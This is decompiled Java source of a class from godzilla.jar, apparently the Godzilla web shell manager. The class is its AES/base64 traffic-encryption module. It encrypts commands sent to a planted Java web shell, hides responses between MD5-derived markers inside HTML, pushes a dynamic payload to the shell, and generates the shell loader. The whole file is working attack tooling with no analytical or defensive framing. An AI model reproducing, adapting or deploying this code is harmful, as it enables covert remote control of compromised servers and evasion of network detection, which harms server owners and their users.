/*     */ package shells.cryptions.JavaAes;
/*     */ 
/*     */ import core.annotation.CryptionAnnotation;
/*     */ import core.imp.Cryption;
/*     */ import core.shell.ShellEntity;
/*     */ import java.net.URLEncoder;
/*     */ import javax.crypto.Cipher;
/*     */ import javax.crypto.spec.SecretKeySpec;
/*     */ import util.Log;
/*     */ import util.functions;
/*     */ import util.http.Http;
/*     */ 
/*     */ 
/*     */ @CryptionAnnotation(Name = "JAVA_AES_BASE64", payloadName = "JavaDynamicPayload")
/*     */ public class JavaAesBase64
/*     */   implements Cryption
/*     */ {
/*     */   private ShellEntity shell;
/*     */   private Http http;
/*     */   private Cipher decodeCipher;
/*     */   private Cipher encodeCipher;
/*     */   private String key;
/*     */   private boolean state;
/*     */   private byte[] payload;
/*     */   private String findStrLeft;
/*     */   private String pass;
/*     */   private String findStrRight;
/*     */   
/*     */   public void init(ShellEntity context) {
/*  30 */     this.shell = context;
/*  31 */     this.http = this.shell.getHttp();
/*  32 */     this.key = this.shell.getSecretKeyX();
/*  33 */     this.pass = this.shell.getPassword();
/*  34 */     String findStrMd5 = functions.md5(this.pass + this.key);
/*  35 */     this.findStrLeft = findStrMd5.substring(0, 16).toUpperCase();
/*  36 */     this.findStrRight = findStrMd5.substring(16).toUpperCase();
/*     */     try {
/*  38 */       this.encodeCipher = Cipher.getInstance("AES");
/*  39 */       this.decodeCipher = Cipher.getInstance("AES");
/*  40 */       this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), "AES"));
/*  41 */       this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), "AES"));
/*  42 */       this.payload = this.shell.getPayloadModule().getPayload();
/*  43 */       if (this.payload != null) {
/*  44 */         this.http.sendHttpResponse(this.payload);
/*  45 */         this.state = true;
/*     */       } else {
/*  47 */         Log.error("payload Is Null");
/*     */       }
/*     */     
/*  50 */     } catch (Exception e) {
/*  51 */       Log.error(e);
/*     */       return;
/*     */     } 
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] encode(byte[] data) {
/*     */     try {
/*  60 */       return (this.pass + "=" + URLEncoder.encode(functions.base64EncodeToString(this.encodeCipher.doFinal(data)))).getBytes();
/*  61 */     } catch (Exception e) {
/*  62 */       Log.error(e);
/*  63 */       return null;
/*     */     } 
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] decode(byte[] data) {
/*     */     try {
/*  71 */       data = functions.base64Decode(findStr(data));
/*  72 */       return this.decodeCipher.doFinal(data);
/*  73 */     } catch (Exception e) {
/*  74 */       Log.error(e);
/*  75 */       return null;
/*     */     } 
/*     */   }
/*     */   
/*     */   public String findStr(byte[] respResult) {
/*  80 */     String htmlString = new String(respResult);
/*  81 */     return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight);
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean isSendRLData() {
/*  87 */     return true;
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean check() {
/*  94 */     return this.state;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] generate(String password, String secretKey) {
/* 100 */     return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), false);
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\cryptions\JavaAes\JavaAesBase64.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */